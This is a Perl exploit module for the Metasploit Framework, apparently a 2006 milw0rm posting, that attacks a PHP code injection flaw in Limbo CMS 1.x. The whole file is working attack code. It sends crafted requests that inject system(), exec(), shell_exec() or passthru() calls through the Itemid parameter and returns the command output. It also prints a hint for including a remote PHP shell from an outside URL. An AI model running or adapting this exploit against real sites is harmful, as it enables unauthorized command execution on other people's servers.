##
#      Title: Limbo CMS version 1.x suffers from a remote code execution vulnerability. 
#    Name: limbo_cms_1_x.pm
# License: Artistic/BSD/GPL
#         Info: Trying to get the command execution exploits out of the way on milw0rm.com. M's are always good.
#
#
#  - This is an exploit module for the Metasploit Framework, please see
#     http://metasploit.com/projects/Framework for more information.
##

package Msf::Exploit::limbo_cms_1_x;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { };

my $info = {
	'Name'     => 'Limbo CMS version 1.x Code Execution',
	'Version'  => '$Revision: 1.1 $',
	'Authors'  => [ 'sirh0t < sirh0t [at] hotmail.com >' ],
	'Arch'     => [ ],
	'OS'       => [ ],
	'Priv'     => 0,
	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'RPATH' => [1, 'DATA', 'Path to the index.php script', ' /limbo/index.php'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Description' => Pex::Text::Freeform(qq{
			This module exploits an arbitrary PHP code execution flaw in the Limbo version 1.*. All versions UNPATCHED Limbo 1.x are affected. Bug found by Aleksander Hristov
}),
#milw0rm this is your part ;p
	'Refs' =>
	  [
		['OSVDB', '-----'],
		['CVE',   '---------'],
		['MIL',   '125'],
	  ],

	'Payload' =>
	  {
		'Space' => 512,
		'Keys'     => ['cmd', 'cmd_bash'],
	  },

	'DefaultTarget' => 1,
	'Targets' =>
	  [
		['Vulnerably test',0],
		['use system()', 1],
		['use exec()', 2],
		['use shell_exec()',3],
		['use passthru()',4],
	  ],


	'Keys' => ['limbo'],

	'DisclosureDate' => 'Mar 03 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->GetVar('RHOST');
	my $vhost          = $self->GetVar('VHOST') || $target_host;
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $target      = $self->Targets->[$target_idx];
	my $path           = $self->GetVar('RPATH');
	my $cmd            = $self->GetVar('EncodedPayload')->RawPayload;
	my ($data);

	# Add an echo on each end for easy output capturing
	$cmd = "echo _cmd_beg_;".$cmd.";echo _cmd_end_";

	# Replacing all spaces with %20
	$cmd =~ s/ /%20/g;

	# Create the get request data
	if ($target_idx == 0) {
		$data = "?option=frontpage&Itemid=phpinfo()";
	} elsif($target_idx == 1) {
		$data = "?option=frontpage&Itemid=system(\$_GET[m])&m=$cmd";
	} elsif($target_idx == 2) {
		$data = "?option=frontpage&Itemid=exec(\$_GET[m])&m=$cmd";
	} elsif($target_idx == 3) {
		$data = "?option=frontpage&Itemid=shell_exec(\$_GET[m])&m=$cmd";
	} elsif($target_idx == 4) {
		$data = "?option=frontpage&Itemid=passthru(\$_GET[m])&m=$cmd";
	}

	my $req =
	  "GET $path$data HTTP/1.1\r\n".
	  "Accept: */*\r\n".
	  "User-Agent: Mozilla/4.0 (MetaSploit)\r\n".
	  "Host: $vhost\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Sending the malicious Limbo request...");

	$s->Send($req);
	my $results = $s->Recv(-1, 20);
	$s->Close();

	if ($target_idx == 0) {
	if ($results =~ /disable_functions/) {
		$self->PrintLine("[*] Server is vuln!");
		if ($results =~ /system()/) {
			$self->PrintLine("[?] system() is disabled");
		}
		if ($results =~ /shell_exec()/) {
			$self->PrintLine("[?] shell_exec() is disabled");
		}
		if ($results =~ /passthru()/) {
			$self->PrintLine("[?] shell_exec() is disabled");
		}
		if ($results =~ /exec()/) {
			$self->PrintLine("[?] exec() is disabled");
		}
			$self->PrintLine("[*] If safe_mode=on try $vhost$path?option=frontpage&Itemid=include(\$_GET[m])&m=http://PHPSHELL?&");

	} else {
	 	$self->PrintLine("[-] Server NOT vuln!");
	} 
	} elsif ($results =~ m/_cmd_beg_(.*)_cmd_end_/ms) {
		my $out = $1;
		$out =~ s/^\s+|\s+$//gs;
		if ($out) {
			$self->PrintLine('----------------------------------------');
			$self->PrintLine('');
			$self->PrintLine($out);
			$self->PrintLine('');
			$self->PrintLine('----------------------------------------');
		}
	} else {
		$self->PrintLine('[-] exploit failed');
	}

	return;
}

1;

# milw0rm.com [2006-03-07]